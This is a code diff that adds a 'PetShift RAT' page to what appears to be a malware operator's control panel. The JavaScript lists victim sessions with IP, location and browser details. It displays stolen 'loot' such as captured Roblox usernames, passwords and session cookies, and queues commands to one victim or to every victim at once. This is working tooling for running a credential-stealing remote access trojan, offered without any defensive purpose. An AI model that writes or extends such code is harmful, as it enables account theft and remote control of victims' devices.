@@ -94,6 +94,7 @@ function showPage(name) {
   if (name === 'admin') loadAdminUsers();
   if (name === 'browsers') refreshBrowsers();
   if (name === 'donut') refreshDonut();
+  if (name === 'petshift') refreshPetshift();
   if (name === 'android') refreshAndroids();
 }
 
@@ -1899,3 +1900,166 @@ window.closeDonutDetail = closeDonutDetail;
 window.donutCmd = donutCmd;
 window.donutMass = donutMass;
 window.donutDelete = donutDelete;
+
+
+/* ===== PetShift RAT ===== */
+let psSelected = null;
+let psCache = [];
+
+async function refreshPetshift() {
+  try {
+    const r = await fetch('/api/petshift/list');
+    if (!r.ok) return;
+    psCache = await r.json();
+    const q = (document.getElementById('petshift-search')?.value || '').toLowerCase().trim();
+    let list = psCache;
+    if (q) {
+      list = list.filter(p =>
+        (p.pid || '').toLowerCase().includes(q) ||
+        (p.ip || '').toLowerCase().includes(q) ||
+        (p.roblox_user || '').toLowerCase().includes(q) ||
+        (p.platform || '').toLowerCase().includes(q) ||
+        (p.ua || '').toLowerCase().includes(q)
+      );
+    }
+    const el = document.getElementById('petshift-list');
+    const count = document.getElementById('petshift-count');
+    if (count) count.textContent = list.length + ' sessions';
+    if (!el) return;
+    if (!list.length) {
+      el.innerHTML = '<div class="empty">no PetShift sessions yet — open START.html on a target</div>';
+      return;
+    }
+    el.innerHTML = list.map(p => {
+      const geo = p.geo ? `${p.geo.city || ''} ${p.geo.country || ''}`.trim() : '';
+      const age = lastSeenAge(p.last_seen);
+      const user = p.roblox_user || 'no login';
+      return `<div class="victim-card" onclick="openPetshiftDetail('${p.pid}')">
+        <div class="vc-top"><span class="vc-name">${esc(user)}</span><span class="vc-tag">${esc(p.platform || 'web')}</span></div>
+        <div class="vc-meta">${esc(p.ip || '?')} · ${esc(geo || '—')}</div>
+        <div class="vc-meta">loot ${p.loot_count || 0} · ${esc(age)} · ${esc((p.pid || '').slice(0,10))}</div>
+        <div class="vc-meta muted">${esc((p.ua || '').slice(0,90))}</div>
+      </div>`;
+    }).join('');
+  } catch (e) { console.warn(e); }
+}
+
+async function openPetshiftDetail(pid) {
+  psSelected = pid;
+  const p = psCache.find(x => x.pid === pid) || {};
+  document.getElementById('petshift-list').style.display = 'none';
+  const det = document.getElementById('ps-detail');
+  det.style.display = 'block';
+  det.classList.remove('hidden');
+  document.getElementById('ps-title').textContent = p.roblox_user || pid.slice(0, 12);
+  document.getElementById('ps-subtitle').textContent = `${p.ip || '?'} · ${p.platform || ''} · ${p.login_method || ''}`;
+  document.getElementById('ps-stats').innerHTML = `<span class="pill">loot ${p.loot_count || 0}</span><span class="pill">${esc(lastSeenAge(p.last_seen))}</span>`;
+  document.getElementById('ps-session-meta').textContent = JSON.stringify({
+    pid, ip: p.ip, platform: p.platform, screen: p.screen, timezone: p.timezone,
+    roblox_user: p.roblox_user, roblox_id: p.roblox_id, login_method: p.login_method,
+    geo: p.geo, ua: p.ua, cookie_count: p.cookie_count, first_seen: p.first_seen, last_seen: p.last_seen
+  }, null, 2);
+  document.getElementById('ps-notes').value = p.notes || '';
+  document.getElementById('ps-delete-btn').onclick = async () => {
+    await fetch('/api/petshift/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ pid }) });
+    closePetshiftDetail();
+    refreshPetshift();
+  };
+  document.querySelectorAll('[data-ps-cmd]').forEach(btn => {
+    btn.onclick = () => psCmd(pid, btn.getAttribute('data-ps-cmd'));
+  });
+  await loadPetshiftLoot(pid);
+}
+
+function closePetshiftDetail() {
+  psSelected = null;
+  document.getElementById('ps-detail').style.display = 'none';
+  document.getElementById('petshift-list').style.display = '';
+}
+
+async function loadPetshiftLoot(pid) {
+  const box = document.getElementById('ps-loot');
+  box.innerHTML = 'loading…';
+  try {
+    const r = await fetch('/api/petshift/loot/' + encodeURIComponent(pid));
+    const items = await r.json();
+    if (!items.length) { box.innerHTML = '<div class="muted">no loot yet</div>'; return; }
+    box.innerHTML = items.slice().reverse().map(it => {
+      const d = it.data;
+      let highlight = '';
+      if (d && typeof d === 'object') {
+        if (d.password || d.user) {
+          highlight += `<div style="margin:0 0 8px;padding:10px;border-radius:10px;background:rgba(225,29,72,.12);border:1px solid rgba(225,29,72,.35);font-family:var(--mono);font-size:12px">
+            <div><span class="muted">user</span> <b>${esc(d.user||'')}</b></div>
+            <div><span class="muted">password</span> <b style="color:var(--accent2)">${esc(d.password||'(none)')}</b></div>
+            <div><span class="muted">method</span> ${esc(d.method||it.type||'')}</div>
+          </div>`;
+        }
+        const rbx = d.roblox_cookies || (it.type==='roblox_cookies'?d:null);
+        if (rbx && typeof rbx === 'object' && Object.keys(rbx).length) {
+          const lines = Object.entries(rbx).slice(0, 20).map(([k,v])=>`<div><span class="muted">${esc(k)}</span> <b style="word-break:break-all">${esc(String(v).slice(0,180))}</b></div>`).join('');
+          highlight += `<div style="margin:0 0 8px;padding:10px;border-radius:10px;background:rgba(56,189,248,.08);border:1px solid rgba(56,189,248,.25);font-family:var(--mono);font-size:11px"><div style="margin-bottom:6px;font-weight:600">Roblox cookies</div>${lines}</div>`;
+        }
+        if (it.type==='cookies' && d && typeof d==='object') {
+          const lines = Object.entries(d).slice(0, 25).map(([k,v])=>`<div><span class="muted">${esc(k)}</span> ${esc(String(v).slice(0,120))}</div>`).join('');
+          highlight += `<div style="margin:0 0 8px;padding:10px;border-radius:10px;background:var(--card);border:1px solid var(--border);font-family:var(--mono);font-size:11px"><div style="margin-bottom:6px;font-weight:600">Cookies</div>${lines}</div>`;
+        }
+      }
+      const data = typeof d === 'string' ? d : JSON.stringify(d, null, 2);
+      return `<div class="loot-row" style="border:1px solid var(--border);border-radius:10px;padding:10px;background:var(--card2)">
+        <div style="display:flex;justify-content:space-between;gap:8px;margin-bottom:6px">
+          <b>${esc(it.type || 'dump')}</b><span class="muted">${esc(it.ts || '')}</span>
+        </div>
+        ${highlight}
+        <pre style="margin:0;white-space:pre-wrap;word-break:break-word;font-family:var(--mono);font-size:11px;max-height:220px;overflow:auto">${esc(data).slice(0, 8000)}</pre>
+      </div>`;
+    }).join('');
+  } catch (e) {
+    box.innerHTML = 'failed to load loot';
+  }
+}
+
+async function psCmd(pid, cmd) {
+  await fetch('/api/petshift/cmd', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ pid, cmd })
+  });
+  toast('queued ' + cmd);
+}
+
+async function psMass(cmd) {
+  await fetch('/api/petshift/cmd', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ pid: '*', cmd })
+  });
+  toast('mass ' + cmd);
+  refreshPetshift();
+}
+
+async function savePetshiftNotes() {
+  if (!psSelected) return;
+  await fetch('/api/petshift/meta', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ pid: psSelected, notes: document.getElementById('ps-notes').value })
+  });
+  toast('notes saved');
+}
+
+window.refreshPetshift = refreshPetshift;
+window.openPetshiftDetail = openPetshiftDetail;
+window.closePetshiftDetail = closePetshiftDetail;
+window.psCmd = psCmd;
+window.psMass = psMass;
+window.savePetshiftNotes = savePetshiftNotes;
+
+try {
+  if (typeof socket !== 'undefined' && socket) {
+    socket.on('petshift_update', () => {
+      if (document.getElementById('page-petshift')?.classList.contains('active')) refreshPetshift();
+    });
+    socket.on('petshift_loot', (msg) => {
+      if (psSelected && msg && msg.pid === psSelected) loadPetshiftLoot(psSelected);
+      if (document.getElementById('page-petshift')?.classList.contains('active')) refreshPetshift();
+    });
+  }
+} catch (e) {}
